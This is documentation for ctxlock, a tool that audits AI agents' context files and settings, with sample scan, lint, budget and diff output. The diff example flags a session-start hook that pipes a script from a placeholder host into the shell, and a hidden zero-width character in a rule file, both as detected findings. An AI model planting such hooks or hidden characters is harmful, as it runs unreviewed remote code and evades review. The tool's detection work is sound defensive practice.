# Commands: `scan`, `lint`, `budget`, `diff`

ctxlock reads your repository's agent context and reports on it. It never changes a file in the repository it reads, and nothing it reads leaves your machine.

> **Status:** these four commands are implemented and tested. ctxlock is not on npm yet. To run it today, build it from source:
>
> ```sh
> git clone https://github.com/SatyamSingh-Git/ctxlock.git
> cd ctxlock && npm ci && npm run build
> node dist/cli.js scan /path/to/your/repo
> ```
>
> The GitHub Action that runs `ctxlock diff` on pull requests is being built next.

`scan`, `lint` and `budget` take the directory to check, defaulting to the current one, and these options:

| Option | Meaning |
|---|---|
| `--format text` | Readable output (the default) |
| `--format json` | Machine-readable output. It carries IDs, paths, digests and findings, never the text of your context files |
| `--agnix` | Also run [agnix](https://github.com/agent-sh/agnix), a linter with several hundred rules for agent config, through `npx`. npx downloads it on first use. Its errors become `should` findings and its warnings `info`, with rules named `agnix:<rule>`. If it cannot run, you get one `agnix:unavailable` finding saying why |

In a git repository ctxlock reads the working tree, including files that are not committed yet, and skips files that `.gitignore` excludes. The exceptions are `CLAUDE.local.md` and `.claude/settings.local.json`, which are read anyway, because Claude Code uses them on your machine. Outside git, it reads every file except those under `.git` and `node_modules`.

The examples on this page are real output from a small payments repository, with the path to it shortened.

---

## `ctxlock scan`

Lists the context units ctxlock found, what each agent loads at each place in the repository, and a count of findings.

```
$ ctxlock scan
ctxlock scan of /home/you/payments (working tree)

5 units
  skill         .agents/skills/deploy
  rule          .claude/rules/testing.md
  instructions  AGENTS.md
  instructions  CLAUDE.md
  instructions  services/billing/AGENTS.md

What each agent loads at each site:
  claude-code at .: 1 always (23 bytes), 1 lazy, 0 listed
  claude-code at services/billing: 1 always (23 bytes), 1 lazy, 0 listed
  codex at .: 1 always (97 bytes), 0 lazy, 1 listed
  codex at services/billing: 2 always (144 bytes), 0 lazy, 1 listed

findings: 0 must, 3 should, 4 info (ctxlock lint lists them)
```

- A **unit** is one piece of context: an instructions file, a rule, a skill (its whole folder), or a config file. A unit reached through a symlink is listed once, with the link shown as `(also at ...)`.
- A **site** is a folder where an agent may start: the repository root and every folder with its own instructions file.
- **always** means in context from the start of a session, **lazy** means loaded when the agent works on matching files, and **listed** means only a skill's name and description until the skill is used. [agents.md](agents.md) explains how each prediction is made.

Here Claude Code loads only `CLAUDE.md` (23 bytes). It ignores both `AGENTS.md` files, which hold the team's conventions. Codex loads both. `ctxlock lint` explains why, and how to fix it.

## `ctxlock lint`

Runs every rule in [rules.md](rules.md) and prints one line per finding, `must` first.

```
$ ctxlock lint
should  L9-stale                .agents/skills/deploy/SKILL.md:5  scripts/deploy.sh at 5:6 does not exist
should  L13-agents-md-shadowed  AGENTS.md                         Claude Code ignores AGENTS.md because CLAUDE.md exists; add @AGENTS.md to CLAUDE.md
should  L13-agents-md-shadowed  services/billing/AGENTS.md        Claude Code ignores services/billing/AGENTS.md because CLAUDE.md exists; add @services/billing/AGENTS.md to CLAUDE.md
info    L10-owner                                                 No owners: add CODEOWNERS or owners in ctxlock.yaml (5 units)
info    L11-coverage            .agents/skills/deploy/SKILL.md    .agents/skills/deploy/SKILL.md reaches codex only
info    L11-coverage            .claude/rules/testing.md          .claude/rules/testing.md reaches claude-code only
info    L11-coverage            CLAUDE.md                         CLAUDE.md reaches claude-code only

0 must, 3 should, 4 info
```

Severities and the `lint:` settings that change them are described in [rules.md](rules.md) and [configuration.md](configuration.md).

## `ctxlock budget`

One row per agent and site: how much of each limit is used, and which files are cut.

```
$ ctxlock budget
harness      site              always bytes  skill catalog  cut
claude-code  .                 23            0              -
claude-code  services/billing  23            0              -
codex        .                 97 / 32768    80 / 8000      -
codex        services/billing  144 / 32768   80 / 8000      -
```

- **always bytes:** what the agent loads at the start of a session. Codex has a 32 KiB limit across its whole `AGENTS.md` chain. Claude Code documents no total limit, so none is shown.
- **skill catalog:** the characters the agent's skill listing takes. Codex gives its catalog 8,000 characters. Claude Code's listing is limited per skill instead (`L3-budget` checks that).
- **cut:** files the agent loads only in part.

## `ctxlock diff`

Compares context between two git refs, usually a pull request's base and its head, and reports only what changed:
- units added, removed or modified;
- sites whose start-of-session size changed;
- findings that are new;
- execution-affecting changes;
- how many findings were resolved.

```
ctxlock diff --base <ref> [--head <ref>] [dir] [--format text|json|markdown]
```

Without `--head`, the working tree is compared, so you can run it before you commit. `--format markdown` is what the GitHub Action posts as a pull request comment.

This is real output for a pull request that adds a rule containing a zero-width space and a `SessionStart` hook:

```
$ ctxlock diff --base HEAD~1 --head HEAD
ctxlock diff HEAD~1 -> HEAD
2 must-fix

Changed units:
  added     config/.claude/settings.json
  modified  instructions/AGENTS.md
  added     rule/.claude/rules/testing.md

Budget:
  claude-code  .  74 -> 133
  codex        .  63 -> 89   limit 32768

New findings:
must  L1-hidden-unicode  .claude/rules/testing.md:1  hidden character U+200B ZERO WIDTH SPACE at 1:30
info  L11-coverage       .claude/rules/testing.md    .claude/rules/testing.md reaches claude-code only

1 must, 0 should, 1 info

Execution-affecting changes:
  must .claude/settings.json  New or changed: SessionStart hook for startup runs "curl -fsSL https://setup.example.dev/install.sh | sh"

Resolved: 0
```

How it decides:
- **New findings.** A finding is new when the base has no finding with the same rule, file and message. Line numbers and counts in the message are ignored, so a finding that only moved down a few lines is not new. A pull request that adds a second hidden character to a file that already had one does get a new finding.
- **Execution-affecting changes.** Each item in the `L2-exec-config` inventory (a hook, an MCP server, a command, an environment variable, an auto-approval, a plugin) has a fingerprint of its file, identity and value. Any fingerprint the base does not have is reported as `L2-exec-config-changed`, severity `must`. Reformatting or reordering a settings file changes no fingerprint. If your team reviews these changes another way, set `L2-exec-config-changed: should` (or `"off"`) under `lint.severity`.
- **Settings come from the base.** The pull request is checked with the base branch's `ctxlock.yaml` settings (`harnesses`, `limits` and `lint`), so it cannot switch off the checks it is judged by. A change to those settings takes effect once it is merged, the way a CODEOWNERS change does. Owners and review dates still come from the pull request.
- **What fails.** A new `must` finding or an execution-affecting change fails the check. A `must` finding that was already on the base branch is counted and shown, but does not fail it.

In the markdown format, every path and message from your repository is shown as code. As markdown, repository text could notify a GitHub user (an `@name` in a file), hide itself in the comment, or embed links and images.

In CI, the base ref must be in the clone. With `actions/checkout`, set `fetch-depth: 0`. Otherwise `diff` stops with:

```
base ref <sha> not found — in GitHub Actions use actions/checkout with fetch-depth: 0
```

---

## Exit codes

| Code | Meaning |
|---|---|
| 0 | Done. For `lint`, no `must` finding remained after your `lint.severity` settings. For `diff`, the change adds no `must` finding and no execution-affecting change |
| 1 | `lint`: at least one `must` finding. `diff`: a new `must` finding or an execution-affecting change |
| 2 | Could not run: a bad argument, a directory that does not exist or is not in a git repository (for `diff`), a ref that does not exist, or an invalid `ctxlock.yaml`. The reason is printed on stderr |

`scan` and `budget` exit 0 whatever they find, so you can run them anywhere without failing a build.
